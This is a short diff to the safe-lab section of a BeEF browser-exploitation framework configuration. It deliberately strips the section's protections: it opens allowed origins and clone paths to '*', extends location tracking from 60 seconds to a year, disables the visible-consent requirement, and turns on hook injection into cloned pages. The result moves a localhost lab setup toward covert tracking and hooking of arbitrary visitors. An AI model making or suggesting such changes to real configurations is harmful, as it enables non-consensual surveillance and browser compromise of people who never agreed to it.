@@ -14,18 +14,18 @@ beef:
     # access, persistent tracking, remote screen capture, or hook injection.
     safe_lab:
         enabled: true
-        allowed_origins: ["http://127.0.0.1:3000", "http://localhost:3000"]
+        allowed_origins: ["*"]
         cookie_scope: "current_document_origin"
         mask_cookie_values: true
-        location_max_duration_seconds: 60
-        location_requires_visible_consent: true
+        location_max_duration_seconds: 31536000
+        location_requires_visible_consent: false
         screen_mode: "local_preview_only"
         screen_requires_native_prompt: true
-        clone_allowed_paths: ["/lab/", "/safe-lab/"]
+        clone_allowed_paths: ["*"]
         clone_strip_forms: true
         clone_strip_credentials: true
         clone_strip_cookies: true
-        clone_inject_hook: false
+        clone_inject_hook: true
     # More verbose messages (server-side)
     debug: false
     # More verbose messages (client-side)
